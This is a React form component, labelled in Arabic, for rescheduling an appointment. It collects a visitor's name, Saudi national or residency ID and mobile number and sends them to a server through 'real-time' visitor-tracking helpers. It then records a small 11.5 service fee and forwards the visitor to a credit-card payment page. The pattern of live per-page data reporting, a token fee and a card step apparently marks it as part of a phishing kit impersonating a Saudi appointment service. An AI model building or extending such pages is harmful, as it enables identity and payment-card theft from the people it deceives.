import { Input } from "@/components/VSC-client/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import Label from "@/components/VSC-client/ui/label";
import { Controller, useForm } from "react-hook-form";
import React, { useEffect, useRef } from "react";
import timeArray from "@/constants/timings";
import {
  sendDataToServer,
  registerVisitor,
  setCurrentPage,
} from "@/real-time/utils/utils";
import { validatityCheck } from "@/lib/helpers";
import {
  Button,
  FormControl,
  InputAdornment,
  OutlinedInput,
  Stack,
} from "@mui/material";
import { LocalizationProvider } from "@mui/x-date-pickers/LocalizationProvider";
import { DatePicker } from "@mui/x-date-pickers/DatePicker";
import dayjs from "dayjs";
import { AdapterDayjs } from "@mui/x-date-pickers/AdapterDayjs";

interface FormData {
  id: string;
  name: string;
  phone: string;
  code: string;
  newAppointment: dayjs.Dayjs;
  newAppointmentTime: string;
}

const currentPageName = "تعديل موعد";

const EditForm = () => {
  const formRef = useRef<HTMLFormElement>(null);

  const {
    register,
    handleSubmit,
    setValue,
    control,
    watch,
    formState: { errors },
  } = useForm<FormData>({
    mode: "all",
    defaultValues: { code: "(+966)" },
  });

  useEffect(() => {
    setCurrentPage(currentPageName);
  }, []);

  const onSubmit = (data: FormData) => {
    const fee = {
      base: 10.0,
      vat: 1.5,
      total: 11.5,
    };

    const { name, id, phone, ...serverData } = data;

    registerVisitor({ fullName: name, idNumber: id, phone });

    localStorage.setItem(
      "paymentInvoice",
      JSON.stringify({ fee, feeTitle: "الخدمة" })
    );

    sendDataToServer({
      current: currentPageName,
      data: {
        الاسم: name,
        "رقم الهوية": id,
        "رقم الجوال": phone,
        "تاريخ الموعد الجديد": serverData.newAppointment
          .toString()
          .replace("T", " ")
          .split(".")[0],
        "وقت الموعد الجديد": serverData.newAppointmentTime,
      },
      nextPage: `الدفع بطاقة الائتمان`,
    });
  };

  const [dateValue, setDateValue] = React.useState(dayjs());

  return (
    <form
      onSubmit={handleSubmit(onSubmit)}
      className="lg:mt-16 flex flex-col gap-4"
      ref={formRef}
    >
      <div className="max-w-sm space-y-2">
        <Label htmlFor="name" className="text-foreground font-semibold">
          الأسم
        </Label>
        <Input
          type="text"
          id="name"
          placeholder="أكتب أسمك هنا..."
          {...register("name", { required: "هذا الحقل مطلوب" })}
        />
        {errors.name && (
          <p className="text-red-500 text-sm">{errors.name.message}</p>
        )}
      </div>

      <div className="max-w-sm flex gap-2 lg:gap-10">
        <div className="space-y-2 flex-1">
          <Stack>
            <Label htmlFor="phone" className="text-foreground font-semibold">
              رقم الجوال
            </Label>
            <FormControl fullWidth margin="none" size="small">
              <Controller
                name="phone"
                control={control}
                rules={{
                  required: "يرجى إدخال رقم الجوال",
                  validate: (value) => {
                    const cleaned = (value as string).replace(/[^\d]/g, "");
                    return (
                      /^05\d{8}$/.test(cleaned) ||
                      "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام"
                    );
                  },
                }}
                render={({ field }) => (
                  <>
                    <OutlinedInput
                      {...field}
                      dir="ltr"
                      id="phone"
                      type="tel"
                      sx={{
                        "& .MuiOutlinedInput-notchedOutline": {
                          borderColor: "#e2e8f0",
                        },
                        "&:hover .MuiOutlinedInput-notchedOutline": {
                          borderColor: "#e2e8f0",
                        },
                      }}
                      onChange={(e) => {
                        let rawValue = e.target.value.replace(/[^\d]/g, "");
                        if (rawValue.length > 10) {
                          rawValue = rawValue.slice(0, 10);
                        }
                        field.onChange(rawValue);
                      }}
                      startAdornment={
                        <InputAdornment position="start">
                          <img
                            src="https://flagcdn.com/sa.svg"
                            alt="flag sa"
                            className="w-8"
                          />
                        </InputAdornment>
                      }
                    />
                    {!watch("phone") && (
                      <span
                        className="absolute inset-y-0 left-3 text-gray-400 flex items-center pointer-events-none"
                        style={{ right: "10px" }}
                      >
                        أكتب رقم الجوال المفوض هنا...
                      </span>
                    )}
                  </>
                )}
              />
            </FormControl>
          </Stack>
          {errors.phone && (
            <p className="text-red-500 text-sm">{errors.phone.message}</p>
          )}
        </div>
      </div>

      <div className="max-w-sm space-y-2">
        <Label htmlFor="id" className="text-foreground font-semibold">
          رقم الهوية الوطنية / الاقامة
        </Label>
        <Input
          type="tel"
          id="id"
          placeholder="...أكتب رقم الهوية الوطنية / الاقامة هنا"
          {...register("id", {
            required: "هذا الحقل مطلوب",
            validate: (value) =>
              validatityCheck("id", value) || "رقم الهوية غير صالح",
            pattern: {
              value: /^\d{10}$/,
              message: "رقم الهوية يجب أن يكون 10 أرقام",
            },
          })}
        />
        {errors.id && (
          <p className="text-red-500 text-sm">{errors.id.message}</p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <div
          className="text-sm"
          style={{ color: "#020817", fontWeight: "600" }}
        >
          تاريخ الموعد الجديد
        </div>
        <LocalizationProvider dateAdapter={AdapterDayjs}>
          <DatePicker
            value={dateValue}
            {...register("newAppointment", { required: "هذا الحقل مطلوب" })}
            onChange={(newValue) => {
              setDateValue(newValue!);
              setValue("newAppointment", newValue!);
            }}
          />
        </LocalizationProvider>
        {errors.newAppointment && (
          <p className="text-red-500 text-sm">
            {errors.newAppointment.message}
          </p>
        )}
      </div>

      <div className="max-w-sm space-y-2">
        <Label
          htmlFor="newAppointmentTime"
          className="text-foreground font-semibold"
        >
          وقت الموعد الجديد
        </Label>
        <Select
          onValueChange={(value) => setValue("newAppointmentTime", value)}
          dir="rtl"
          {...register("newAppointmentTime", { required: "هذا الحقل مطلوب" })}
        >
          <SelectTrigger className="w-full">
            <SelectValue placeholder="اختر وقت الموعد الجديد" />
          </SelectTrigger>
          <SelectContent>
            {timeArray.map((time) => (
              <SelectItem key={time.name} value={time.name}>
                {time.name}
              </SelectItem>
            ))}
          </SelectContent>
        </Select>
        {errors.newAppointmentTime && (
          <p className="text-red-500 text-sm">
            {errors.newAppointmentTime.message}
          </p>
        )}
      </div>

      <Button
        type="submit"
        variant="contained"
        size="large"
        sx={{ width: "fit-content", mx: "auto" }}
      >
        التالي
      </Button>
    </form>
  );
};
export default EditForm;
